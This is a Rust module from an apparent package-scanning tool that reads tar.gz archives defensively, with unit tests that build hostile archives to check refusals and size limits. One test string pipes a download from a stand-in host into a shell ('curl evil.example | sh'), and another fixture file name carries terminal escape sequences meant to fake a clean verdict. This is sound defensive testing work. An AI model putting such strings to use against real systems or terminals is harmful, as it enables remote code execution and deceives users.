//! Reads a gzipped tarball as a stream, one file at a time.
//!
//! Nothing is written to disk and nothing is executed. The archive is still
//! hostile input, for two reasons.
//!
//! Tools disagree about unusual archives, so an attacker can show Airlock
//! harmless files while npm or tar unpacks others from the same bytes. So we
//! read everything any tool might unpack, and refuse archives whose meaning is
//! ambiguous.
//!
//! Small downloads can expand enormously, so every size is capped. A limit that
//! would leave the result incomplete is an error, and every entry we don't read
//! is reported, because a scan must never look complete when it wasn't.

use crate::text::Untrusted;
use flate2::read::MultiGzDecoder;
use std::fmt;
use std::io::{self, Read};
use tar::{Archive, Entry, EntryType, PaxExtensions};

const MIB: u64 = 1024 * 1024;
/// How many skipped entries are listed. All of them are still counted.
const MAX_SKIPPED_KEPT: usize = 1000;

const SHA1_HEX_LEN: usize = 40;
const SHA256_HEX_LEN: usize = 64;

/// Upper bounds on what we are willing to process.
#[derive(Debug, Clone, Copy)]
pub struct Limits {
    /// Compressed size, as received over the network.
    pub max_download_bytes: u64,
    /// Total size after decompression. Guards against decompression bombs.
    pub max_unpacked_bytes: u64,
    /// Files larger than this are reported as skipped, not read into memory.
    pub max_file_bytes: u64,
    /// Long file names and extended headers. These are always held in memory,
    /// so without a cap a tiny download could claim gigabytes of RAM.
    pub max_metadata_bytes: u64,
    pub max_entries: u64,
}

impl Default for Limits {
    fn default() -> Self {
        Self {
            max_download_bytes: 256 * MIB,
            max_unpacked_bytes: 1024 * MIB,
            max_file_bytes: 32 * MIB,
            max_metadata_bytes: MIB,
            max_entries: 200_000,
        }
    }
}

/// One regular file from the archive.
#[derive(Debug)]
pub struct ArchiveFile {
    /// Path inside the repository, without the archive's top-level folder.
    pub path: Untrusted,
    pub contents: Vec<u8>,
}

/// Why an entry's contents were not read.
#[derive(Debug, PartialEq, Eq)]
pub enum SkipReason {
    TooLarge { size: u64 },
    NotRegularFile,
}

impl fmt::Display for SkipReason {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::TooLarge { size } => write!(f, "too large ({size} bytes)"),
            Self::NotRegularFile => write!(f, "not a regular file"),
        }
    }
}

/// An entry that was seen but not read.
#[derive(Debug, PartialEq, Eq)]
pub struct Skipped {
    pub path: Untrusted,
    pub reason: SkipReason,
}

/// What happened while reading an archive.
#[derive(Debug, Default)]
pub struct Summary {
    pub files: u64,
    pub bytes: u64,
    /// The commit the archive says it was built from, if it says so.
    pub commit: Option<String>,
    /// The first skipped entries. `skipped_total` counts all of them.
    pub skipped: Vec<Skipped>,
    pub skipped_total: u64,
}

impl Summary {
    fn skip(&mut self, path: Untrusted, reason: SkipReason) {
        self.skipped_total += 1;
        if self.skipped.len() < MAX_SKIPPED_KEPT {
            self.skipped.push(Skipped { path, reason });
        }
    }
}

/// Why an archive could not be read completely.
#[derive(Debug)]
pub enum ArchiveError {
    DownloadTooLarge {
        limit: u64,
    },
    UnpackedTooLarge {
        limit: u64,
    },
    TooManyEntries {
        limit: u64,
    },
    /// The archive is built in a way that tools may read differently.
    Refused {
        reason: &'static str,
        path: Option<String>,
    },
    Unreadable(io::Error),
}

impl ArchiveError {
    fn refused_at(reason: &'static str, path: &Untrusted) -> Self {
        Self::Refused {
            reason,
            path: Some(path.raw().to_string()),
        }
    }

    fn refused(reason: &'static str) -> Self {
        Self::Refused { reason, path: None }
    }
}

impl fmt::Display for ArchiveError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::DownloadTooLarge { limit } => {
                write!(f, "download is larger than the {} MiB limit", limit / MIB)
            }
            Self::UnpackedTooLarge { limit } => {
                write!(f, "unpacked size is over the {} MiB limit", limit / MIB)
            }
            Self::TooManyEntries { limit } => {
                write!(f, "archive has more than {limit} entries")
            }
            Self::Refused {
                reason,
                path: Some(path),
            } => write!(f, "refusing archive, {reason}: {path}"),
            Self::Refused { reason, path: None } => write!(f, "refusing archive, {reason}"),
            Self::Unreadable(error) => {
                write!(f, "archive is corrupt or the connection failed: {error}")
            }
        }
    }
}

impl std::error::Error for ArchiveError {}

/// Calls `visit` for each regular file in a `.tar.gz` stream.
///
/// Files are handed over one at a time and can be dropped straight away, so
/// memory use stays near `max_file_bytes` however large the archive is.
pub fn read_archive<R: Read>(
    reader: R,
    limits: &Limits,
    mut visit: impl FnMut(ArchiveFile),
) -> Result<Summary, ArchiveError> {
    let download = LimitedReader::new(reader, limits.max_download_bytes);
    // Tools decode every gzip member, so a single-member decoder would miss
    // anything an attacker placed in a second one.
    let unpacked = LimitedReader::new(MultiGzDecoder::new(download), limits.max_unpacked_bytes);
    let mut archive = Archive::new(unpacked);
    // A zero block normally ends an archive here, but npm carries on after a
    // single one. Reading to the end of the stream covers both, and also makes
    // the decoder verify the gzip checksum.
    archive.set_ignore_zeros(true);

    let result = read_entries(&mut archive, limits, &mut visit);

    // The tar crate wraps I/O errors, so a tripped limit is detected through
    // the readers' own flags rather than by inspecting the error.
    let unpacked = archive.into_inner();
    if unpacked.exceeded {
        return Err(ArchiveError::UnpackedTooLarge {
            limit: limits.max_unpacked_bytes,
        });
    }
    if unpacked.inner.get_ref().exceeded {
        return Err(ArchiveError::DownloadTooLarge {
            limit: limits.max_download_bytes,
        });
    }
    result
}

fn read_entries<R: Read>(
    archive: &mut Archive<R>,
    limits: &Limits,
    visit: &mut impl FnMut(ArchiveFile),
) -> Result<Summary, ArchiveError> {
    let mut summary = Summary::default();
    let mut pending = PendingHeaders::default();
    let mut entries_seen = 0;

    // Raw mode hands us long names and extended headers as entries instead of
    // applying them, so we can cap their size and refuse contradictions.
    let entries = archive
        .entries()
        .map_err(ArchiveError::Unreadable)?
        .raw(true);

    for entry in entries {
        let mut entry = entry.map_err(ArchiveError::Unreadable)?;

        entries_seen += 1;
        if entries_seen > limits.max_entries {
            return Err(ArchiveError::TooManyEntries {
                limit: limits.max_entries,
            });
        }

        let header = entry.header();
        let kind = header.entry_type();
        let has_magic = header.as_ustar().is_some() || header.as_gnu().is_some();

        if has_magic && is_metadata(kind) {
            let data = read_metadata(&mut entry, limits)?;
            if kind.is_pax_global_extensions() {
                if summary.commit.is_none() {
                    summary.commit = commit_from_global_header(&data);
                }
            } else {
                pending.record(kind, &data)?;
            }
            continue;
        }

        let headers = std::mem::take(&mut pending);
        let path = repo_path(headers.path().unwrap_or(&entry.path_bytes()));
        let size = entry.size();

        // Tools disagree on which size wins, so they would find the next entry
        // in different places and see different files.
        if headers.pax_size.is_some_and(|pax_size| pax_size != size) {
            return Err(ArchiveError::refused_at(
                "its extended header and entry header disagree on a size",
                &path,
            ));
        }

        if !kind.is_file() {
            // Some tools skip this data and others read files out of it.
            if size > 0 {
                return Err(ArchiveError::refused_at(
                    "an entry that is not a regular file carries data",
                    &path,
                ));
            }
            if !kind.is_dir() {
                summary.skip(path, SkipReason::NotRegularFile);
            }
            continue;
        }

        // Old archives mark folders this way, which has the same problem.
        if size > 0 && path.raw().ends_with('/') {
            return Err(ArchiveError::refused_at(
                "an entry named like a folder carries data",
                &path,
            ));
        }

        if size > limits.max_file_bytes {
            summary.skip(path, SkipReason::TooLarge { size });
            continue;
        }

        let mut contents = Vec::with_capacity(size as usize);
        entry
            .read_to_end(&mut contents)
            .map_err(ArchiveError::Unreadable)?;

        summary.files += 1;
        summary.bytes += contents.len() as u64;
        visit(ArchiveFile { path, contents });
    }

    if pending.is_active() {
        return Err(ArchiveError::refused(
            "it ends with a header that describes no entry",
        ));
    }

    Ok(summary)
}

fn is_metadata(kind: EntryType) -> bool {
    kind.is_gnu_longname()
        || kind.is_gnu_longlink()
        || kind.is_pax_local_extensions()
        || kind.is_pax_global_extensions()
}

fn read_metadata<R: Read>(
    entry: &mut Entry<'_, R>,
    limits: &Limits,
) -> Result<Vec<u8>, ArchiveError> {
    let size = entry.size();
    if size > limits.max_metadata_bytes {
        return Err(ArchiveError::refused(
            "a file name or extended header is too large",
        ));
    }
    let mut data = Vec::with_capacity(size as usize);
    entry
        .read_to_end(&mut data)
        .map_err(ArchiveError::Unreadable)?;
    Ok(data)
}

/// Metadata entries that describe the next real entry.
#[derive(Default)]
struct PendingHeaders {
    long_name: Option<Vec<u8>>,
    long_link: bool,
    extended: bool,
    pax_path: Option<Vec<u8>>,
    pax_size: Option<u64>,
}

impl PendingHeaders {
    fn is_active(&self) -> bool {
        self.long_name.is_some() || self.long_link || self.extended
    }

    fn path(&self) -> Option<&[u8]> {
        self.long_name.as_deref().or(self.pax_path.as_deref())
    }

    /// Records a metadata entry, refusing any that contradict each other: tools
    /// don't agree on which one wins.
    fn record(&mut self, kind: EntryType, data: &[u8]) -> Result<(), ArchiveError> {
        const CONFLICT: &str = "two headers describe the same entry";

        if kind.is_gnu_longname() {
            if self.long_name.is_some() {
                return Err(ArchiveError::refused(CONFLICT));
            }
            let name = data.split(|byte| *byte == 0).next().unwrap_or(data);
            self.long_name = Some(name.to_vec());
        } else if kind.is_gnu_longlink() {
            if self.long_link {
                return Err(ArchiveError::refused(CONFLICT));
            }
            self.long_link = true;
        } else {
            if self.extended {
                return Err(ArchiveError::refused(CONFLICT));
            }
            self.extended = true;
            self.record_extended(data)?;
        }

        if self.long_name.is_some() && self.pax_path.is_some() {
            return Err(ArchiveError::refused(CONFLICT));
        }
        Ok(())
    }

    fn record_extended(&mut self, data: &[u8]) -> Result<(), ArchiveError> {
        const MALFORMED: &str = "an extended header is malformed";
        const CONFLICT: &str = "an extended header sets the same field twice";

        for field in PaxExtensions::new(data) {
            let field = field.map_err(|_| ArchiveError::refused(MALFORMED))?;
            match field.key_bytes() {
                b"path" => {
                    if self.pax_path.is_some() {
                        return Err(ArchiveError::refused(CONFLICT));
                    }
                    self.pax_path = Some(field.value_bytes().to_vec());
                }
                b"size" => {
                    if self.pax_size.is_some() {
                        return Err(ArchiveError::refused(CONFLICT));
                    }
                    let size = field.value().ok().and_then(|value| value.parse().ok());
                    self.pax_size = Some(size.ok_or(ArchiveError::refused(MALFORMED))?);
                }
                // A sparse file's bytes are scattered, and only some tools
                // reassemble them, so what we read may not be what they write.
                key if key.starts_with(b"GNU.sparse.") => {
                    return Err(ArchiveError::refused("it contains a sparse file"));
                }
                _ => {}
            }
        }
        Ok(())
    }
}

/// `git archive` records the commit in a global header. Anything that isn't a
/// plain commit id is ignored, because this text may get printed.
fn commit_from_global_header(data: &[u8]) -> Option<String> {
    PaxExtensions::new(data)
        .flatten()
        .find(|field| field.key_bytes() == b"comment")
        .and_then(|field| field.value().ok())
        .filter(|value| is_commit_id(value))
        .map(str::to_string)
}

fn is_commit_id(value: &str) -> bool {
    matches!(value.len(), SHA1_HEX_LEN | SHA256_HEX_LEN)
        && value
            .bytes()
            .all(|byte| matches!(byte, b'0'..=b'9' | b'a'..=b'f'))
}

/// Removes the top-level folder hosts add to archives (`owner-repo-sha/`).
///
/// Paths are only ever used as labels, never to touch the filesystem, so a
/// hostile path such as `../../etc/passwd` is harmless here.
fn repo_path(raw: &[u8]) -> Untrusted {
    let inside_root = match raw.iter().position(|byte| *byte == b'/') {
        Some(slash) if slash + 1 < raw.len() => &raw[slash + 1..],
        _ => raw,
    };
    Untrusted::from_bytes(inside_root)
}

/// A reader that fails once more than `limit` bytes have passed through it.
///
/// `Read::take` would not do here: it reports a normal end of file at the
/// limit, and the tar reader could treat that as the archive ending, turning a
/// tripped limit into a scan that silently looks complete.
struct LimitedReader<R> {
    inner: R,
    limit: u64,
    total: u64,
    exceeded: bool,
}

impl<R> LimitedReader<R> {
    fn new(inner: R, limit: u64) -> Self {
        Self {
            inner,
            limit,
            total: 0,
            exceeded: false,
        }
    }
}

impl<R: Read> Read for LimitedReader<R> {
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        let count = self.inner.read(buf)?;
        self.total += count as u64;
        if self.total > self.limit {
            self.exceeded = true;
            return Err(io::Error::other("size limit exceeded"));
        }
        Ok(count)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use flate2::{Compression, write::GzEncoder};
    use std::io::Write;
    use tar::Header;

    const END_MARKER: [u8; 1024] = [0; 1024];
    const ZERO_BLOCK: [u8; 512] = [0; 512];
    const COMMIT: &str = "0123456789abcdef0123456789abcdef01234567";

    fn entry(name: &str, kind: EntryType, claimed_size: u64, data: &[u8]) -> Vec<u8> {
        let mut header = Header::new_ustar();
        header.as_old_mut().name[..name.len()].copy_from_slice(name.as_bytes());
        header.set_entry_type(kind);
        header.set_size(claimed_size);
        header.set_mode(0o644);
        header.set_cksum();

        let mut bytes = header.as_bytes().to_vec();
        bytes.extend_from_slice(data);
        bytes.resize(bytes.len().next_multiple_of(512), 0);
        bytes
    }

    fn file(name: &str, data: &[u8]) -> Vec<u8> {
        entry(name, EntryType::Regular, data.len() as u64, data)
    }

    fn pax_record(key: &str, value: &str) -> String {
        let body = format!(" {key}={value}\n");
        let mut length = body.len() + 1;
        while length.to_string().len() + body.len() != length {
            length = length.to_string().len() + body.len();
        }
        format!("{length}{body}")
    }

    fn pax_header(records: &str) -> Vec<u8> {
        entry(
            "root/PaxHeader",
            EntryType::XHeader,
            records.len() as u64,
            records.as_bytes(),
        )
    }

    fn long_name(name: &[u8]) -> Vec<u8> {
        entry(
            "././@LongLink",
            EntryType::GNULongName,
            name.len() as u64,
            name,
        )
    }

    fn gzip(parts: &[&[u8]]) -> Vec<u8> {
        let mut encoder = GzEncoder::new(Vec::new(), Compression::fast());
        for part in parts {
            encoder.write_all(part).unwrap();
        }
        encoder.finish().unwrap()
    }

    fn read_all(
        bytes: &[u8],
        limits: &Limits,
    ) -> Result<(Vec<ArchiveFile>, Summary), ArchiveError> {
        let mut files = Vec::new();
        let summary = read_archive(bytes, limits, |file| files.push(file))?;
        Ok((files, summary))
    }

    fn paths(bytes: &[u8]) -> Vec<String> {
        let (files, _) = read_all(bytes, &Limits::default()).unwrap();
        files.iter().map(|f| f.path.raw().to_string()).collect()
    }

    fn assert_refused(bytes: &[u8]) {
        let result = read_all(bytes, &Limits::default());
        assert!(
            matches!(result, Err(ArchiveError::Refused { .. })),
            "expected a refusal, got {result:?}"
        );
    }

    #[test]
    fn reads_files_and_strips_the_top_level_folder() {
        let bytes = gzip(&[
            &file("owner-repo-abc123/README.md", b"hello"),
            &file("owner-repo-abc123/src/main.rs", b"fn main() {}"),
            &END_MARKER,
        ]);

        let (files, summary) = read_all(&bytes, &Limits::default()).unwrap();

        assert_eq!(files.len(), 2);
        assert_eq!(files[0].path.raw(), "README.md");
        assert_eq!(files[0].contents, b"hello");
        assert_eq!(files[1].path.raw(), "src/main.rs");
        assert_eq!(summary.files, 2);
        assert_eq!(summary.bytes, 17);
        assert_eq!(summary.skipped_total, 0);
    }

    #[test]
    fn reads_the_commit_from_the_global_header() {
        let records = pax_record("comment", COMMIT);
        let global = entry(
            "pax_global_header",
            EntryType::XGlobalHeader,
            records.len() as u64,
            records.as_bytes(),
        );
        let bytes = gzip(&[&global, &file("root/file.txt", b"data"), &END_MARKER]);

        let (files, summary) = read_all(&bytes, &Limits::default()).unwrap();

        assert_eq!(files.len(), 1);
        assert_eq!(summary.skipped_total, 0);
        assert_eq!(summary.commit.as_deref(), Some(COMMIT));
    }

    #[test]
    fn ignores_a_commit_id_that_could_inject_text() {
        for comment in [
            "x\x1b[2J; curl evil.example | sh",
            "0123456789ABCDEF0123456789ABCDEF01234567",
            "abc123",
        ] {
            let records = pax_record("comment", comment);
            let global = entry(
                "pax_global_header",
                EntryType::XGlobalHeader,
                records.len() as u64,
                records.as_bytes(),
            );
            let bytes = gzip(&[&global, &END_MARKER]);

            let (_, summary) = read_all(&bytes, &Limits::default()).unwrap();

            assert_eq!(summary.commit, None, "comment: {comment:?}");
        }
    }

    #[test]
    fn hostile_file_names_are_kept_for_matching_but_never_displayed_raw() {
        let name = "root/x\x1b]52;c;ZXZpbA==\x07\x1b[2J\nverdict: CLEAN.js";
        let bytes = gzip(&[&file(name, b"x"), &END_MARKER]);

        let (files, _) = read_all(&bytes, &Limits::default()).unwrap();
        let shown = files[0].path.to_string();

        assert!(files[0].path.raw().contains('\x1b'));
        assert!(!shown.contains('\x1b') && !shown.contains('\x07') && !shown.contains('\n'));
    }

    #[test]
    fn reports_oversized_files_without_reading_them() {
        let bytes = gzip(&[
            &file("root/big.bin", b"12345"),
            &file("root/small.txt", b"1234"),
            &END_MARKER,
        ]);
        let limits = Limits {
            max_file_bytes: 4,
            ..Limits::default()
        };

        let (files, summary) = read_all(&bytes, &limits).unwrap();

        assert_eq!(files.len(), 1);
        assert_eq!(files[0].path.raw(), "small.txt");
        assert_eq!(summary.skipped[0].path.raw(), "big.bin");
        assert_eq!(summary.skipped[0].reason, SkipReason::TooLarge { size: 5 });
    }

    #[test]
    fn reports_symlinks_without_following_them() {
        let bytes = gzip(&[&entry("root/link", EntryType::Symlink, 0, b""), &END_MARKER]);

        let (files, summary) = read_all(&bytes, &Limits::default()).unwrap();

        assert!(files.is_empty());
        assert_eq!(summary.skipped[0].path.raw(), "link");
        assert_eq!(summary.skipped[0].reason, SkipReason::NotRegularFile);
    }

    #[test]
    fn does_not_report_empty_folders() {
        let bytes = gzip(&[
            &entry("root/dir/", EntryType::Directory, 0, b""),
            &END_MARKER,
        ]);

        let (_, summary) = read_all(&bytes, &Limits::default()).unwrap();

        assert_eq!(summary.skipped_total, 0);
    }

    #[test]
    fn counts_every_skipped_entry_but_keeps_a_bounded_list() {
        let link = entry("root/link", EntryType::Symlink, 0, b"");
        let mut tar = link.repeat(MAX_SKIPPED_KEPT + 5);
        tar.extend_from_slice(&END_MARKER);

        let (_, summary) = read_all(&gzip(&[&tar]), &Limits::default()).unwrap();

        assert_eq!(summary.skipped.len(), MAX_SKIPPED_KEPT);
        assert_eq!(summary.skipped_total, MAX_SKIPPED_KEPT as u64 + 5);
    }

    // npm keeps reading after one zero block, where most tools stop.
    #[test]
    fn reads_files_after_a_single_zero_block() {
        let bytes = gzip(&[
            &file("root/clean.js", b"clean"),
            &ZERO_BLOCK,
            &file("root/hidden.js", b"payload"),
            &END_MARKER,
        ]);

        assert_eq!(paths(&bytes), ["clean.js", "hidden.js"]);
    }

    #[test]
    fn reads_files_after_the_end_marker() {
        let bytes = gzip(&[
            &file("root/clean.js", b"clean"),
            &END_MARKER,
            &file("root/hidden.js", b"payload"),
            &END_MARKER,
        ]);

        assert_eq!(paths(&bytes), ["clean.js", "hidden.js"]);
    }

    // npm, tar and Python all read a second gzip member.
    #[test]
    fn reads_every_gzip_member() {
        let mut bytes = gzip(&[&file("root/clean.js", b"clean")]);
        bytes.extend(gzip(&[&file("root/hidden.js", b"payload"), &END_MARKER]));

        assert_eq!(paths(&bytes), ["clean.js", "hidden.js"]);
    }

    // npm, tar and Python all read files out of a folder entry's data.
    #[test]
    fn refuses_a_folder_that_carries_data() {
        let inner = file("root/hidden.js", b"payload");
        let bytes = gzip(&[
            &entry(
                "root/dir/",
                EntryType::Directory,
                inner.len() as u64,
                &inner,
            ),
            &END_MARKER,
        ]);

        assert_refused(&bytes);
    }

    // bsdtar and Python read files out of a link entry's data.
    #[test]
    fn refuses_a_link_that_carries_data() {
        let inner = file("root/hidden.js", b"payload");
        let bytes = gzip(&[
            &entry("root/link", EntryType::Symlink, inner.len() as u64, &inner),
            &END_MARKER,
        ]);

        assert_refused(&bytes);
    }

    // tar and Python unpack unknown types as files, npm ignores them.
    #[test]
    fn refuses_an_unknown_entry_type_that_carries_data() {
        let bytes = gzip(&[
            &entry("root/hidden.js", EntryType::new(b'Z'), 7, b"payload"),
            &END_MARKER,
        ]);

        assert_refused(&bytes);
    }

    #[test]
    fn refuses_an_old_style_folder_that_carries_data() {
        let bytes = gzip(&[&file("root/dir/", b"payload"), &END_MARKER]);

        assert_refused(&bytes);
    }

    // The family of bugs behind RUSTSEC-2026-0068 and CVE-2025-62518.
    #[test]
    fn refuses_an_extended_size_that_disagrees_with_the_header() {
        let inner = file("root/hidden.js", b"payload");
        for (extended_size, header_size) in [(inner.len() as u64, 0), (0, inner.len() as u64)] {
            let bytes = gzip(&[
                &pax_header(&pax_record("size", &extended_size.to_string())),
                &entry("root/outer.txt", EntryType::Regular, header_size, &inner),
                &END_MARKER,
            ]);

            assert_refused(&bytes);
        }
    }

    #[test]
    fn accepts_an_extended_size_that_matches_the_header() {
        let bytes = gzip(&[
            &pax_header(&pax_record("size", "5")),
            &file("root/file.txt", b"hello"),
            &END_MARKER,
        ]);

        assert_eq!(paths(&bytes), ["file.txt"]);
    }

    #[test]
    fn refuses_sparse_files() {
        let bytes = gzip(&[
            &pax_header(&pax_record("GNU.sparse.major", "1")),
            &file("root/file.txt", b"hello"),
            &END_MARKER,
        ]);

        assert_refused(&bytes);
    }

    #[test]
    fn uses_long_names_and_extended_paths() {
        let long = format!("root/{}/file.js", "d".repeat(150));
        let expected = format!("{}/file.js", "d".repeat(150));

        let mut with_terminator = long.clone().into_bytes();
        with_terminator.push(0);
        let bytes = gzip(&[
            &long_name(&with_terminator),
            &file("root/short", b"x"),
            &END_MARKER,
        ]);
        assert_eq!(paths(&bytes), [expected.clone()]);

        let bytes = gzip(&[
            &pax_header(&pax_record("path", &long)),
            &file("root/short", b"x"),
            &END_MARKER,
        ]);
        assert_eq!(paths(&bytes), [expected]);
    }

    #[test]
    fn a_long_name_applies_only_to_the_next_entry() {
        let bytes = gzip(&[
            &long_name(b"root/renamed.js"),
            &file("root/a", b"x"),
            &file("root/b", b"y"),
            &END_MARKER,
        ]);

        assert_eq!(paths(&bytes), ["renamed.js", "b"]);
    }

    #[test]
    fn refuses_headers_that_contradict_each_other() {
        let two_long_names = gzip(&[
            &long_name(b"root/a"),
            &long_name(b"root/b"),
            &file("root/x", b"x"),
            &END_MARKER,
        ]);
        let two_extended = gzip(&[
            &pax_header(&pax_record("path", "root/a")),
            &pax_header(&pax_record("path", "root/b")),
            &file("root/x", b"x"),
            &END_MARKER,
        ]);
        let long_name_and_path = gzip(&[
            &long_name(b"root/a"),
            &pax_header(&pax_record("path", "root/b")),
            &file("root/x", b"x"),
            &END_MARKER,
        ]);
        let same_field_twice = gzip(&[
            &pax_header(&(pax_record("path", "root/a") + &pax_record("path", "root/b"))),
            &file("root/x", b"x"),
            &END_MARKER,
        ]);

        assert_refused(&two_long_names);
        assert_refused(&two_extended);
        assert_refused(&long_name_and_path);
        assert_refused(&same_field_twice);
    }

    #[test]
    fn refuses_a_header_with_nothing_after_it() {
        assert_refused(&gzip(&[&long_name(b"root/a"), &END_MARKER]));
        assert_refused(&gzip(&[
            &pax_header(&pax_record("path", "root/a")),
            &END_MARKER,
        ]));
    }

    #[test]
    fn refuses_a_malformed_extended_header() {
        for records in ["garbage", "abc path=x\n", "1000 path=x\n"] {
            let bytes = gzip(&[&pax_header(records), &file("root/x", b"x"), &END_MARKER]);

            assert_refused(&bytes);
        }
        let not_a_number = pax_record("size", "-1");
        assert_refused(&gzip(&[
            &pax_header(&not_a_number),
            &file("root/x", b"x"),
            &END_MARKER,
        ]));
    }

    #[test]
    fn caps_file_names_before_they_reach_memory() {
        let name = vec![b'a'; 2048];
        let bytes = gzip(&[&long_name(&name), &file("root/x", b"x"), &END_MARKER]);
        let limits = Limits {
            max_metadata_bytes: 1024,
            ..Limits::default()
        };

        let result = read_all(&bytes, &limits);

        assert!(matches!(result, Err(ArchiveError::Refused { .. })));
    }

    #[test]
    fn stops_a_decompression_bomb() {
        let zeros = vec![0u8; 8 * MIB as usize];
        let bytes = gzip(&[&file("root/bomb", &zeros), &END_MARKER]);
        assert!(bytes.len() < MIB as usize, "fixture should compress well");
        let limits = Limits {
            max_unpacked_bytes: MIB,
            max_file_bytes: 16 * MIB,
            ..Limits::default()
        };

        let result = read_all(&bytes, &limits);

        assert!(matches!(result, Err(ArchiveError::UnpackedTooLarge { .. })));
    }

    #[test]
    fn a_bomb_is_caught_even_when_the_file_is_skipped_as_too_large() {
        let zeros = vec![0u8; 8 * MIB as usize];
        let bytes = gzip(&[
            &file("root/bomb", &zeros),
            &file("root/after.txt", b"x"),
            &END_MARKER,
        ]);
        let limits = Limits {
            max_unpacked_bytes: MIB,
            max_file_bytes: 1024,
            ..Limits::default()
        };

        let result = read_all(&bytes, &limits);

        assert!(matches!(result, Err(ArchiveError::UnpackedTooLarge { .. })));
    }

    #[test]
    fn enforces_the_download_limit() {
        let bytes = gzip(&[&file("root/file.txt", b"hello"), &END_MARKER]);
        let limits = Limits {
            max_download_bytes: 8,
            ..Limits::default()
        };

        let result = read_all(&bytes, &limits);

        assert!(matches!(result, Err(ArchiveError::DownloadTooLarge { .. })));
    }

    #[test]
    fn enforces_the_entry_limit() {
        let bytes = gzip(&[
            &file("root/a", b"a"),
            &file("root/b", b"b"),
            &file("root/c", b"c"),
            &END_MARKER,
        ]);
        let limits = Limits {
            max_entries: 2,
            ..Limits::default()
        };

        let result = read_all(&bytes, &limits);

        assert!(matches!(result, Err(ArchiveError::TooManyEntries { .. })));
    }

    #[test]
    fn a_download_cut_off_anywhere_is_an_error_not_a_partial_success() {
        let bytes = gzip(&[
            &file("root/a.txt", b"first file contents"),
            &file("root/b.txt", b"second file contents"),
            &END_MARKER,
        ]);

        for cut in 0..bytes.len() {
            let result = read_all(&bytes[..cut], &Limits::default());

            assert!(
                matches!(result, Err(ArchiveError::Unreadable(_))),
                "cut at {cut} of {}",
                bytes.len()
            );
        }
    }

    #[test]
    fn a_corrupt_gzip_checksum_is_an_error() {
        let mut bytes = gzip(&[&file("root/a.txt", b"contents"), &END_MARKER]);
        let checksum_at = bytes.len() - 8;
        bytes[checksum_at] ^= 0xff;

        let result = read_all(&bytes, &Limits::default());

        assert!(matches!(result, Err(ArchiveError::Unreadable(_))));
    }

    #[test]
    fn input_that_is_not_gzip_is_an_error() {
        let result = read_all(b"<html>this is not an archive</html>", &Limits::default());

        assert!(matches!(result, Err(ArchiveError::Unreadable(_))));
    }

    #[test]
    fn garbage_after_the_archive_is_an_error() {
        let mut bytes = gzip(&[&file("root/a.txt", b"contents"), &END_MARKER]);
        bytes.extend_from_slice(b"garbage after the gzip stream");

        assert!(read_all(&bytes, &Limits::default()).is_err());

        let bytes = gzip(&[&file("root/a.txt", b"x"), &END_MARKER, &[0x41; 512]]);

        assert!(read_all(&bytes, &Limits::default()).is_err());
    }

    #[test]
    fn mutated_archives_never_panic() {
        let tar = [
            pax_header(&pax_record("path", "root/renamed.js")),
            file("root/a.js", b"contents"),
            long_name(b"root/long"),
            file("root/b.js", b"contents"),
            entry("root/link", EntryType::Symlink, 0, b""),
            entry("root/dir/", EntryType::Directory, 0, b""),
            END_MARKER.to_vec(),
        ]
        .concat();
        let limits = Limits {
            max_unpacked_bytes: MIB,
            max_metadata_bytes: 4096,
            ..Limits::default()
        };

        // A fixed seed, so a failure can be reproduced.
        let mut state = 0x9E37_79B9_7F4A_7C15_u64;
        let mut next = move || {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            state
        };

        for _ in 0..3000 {
            let mut mutated = tar.clone();
            for _ in 0..1 + next() % 8 {
                let at = next() as usize % mutated.len();
                mutated[at] = next() as u8;
            }
            let _ = read_all(&gzip(&[&mutated]), &limits);
        }
    }
}
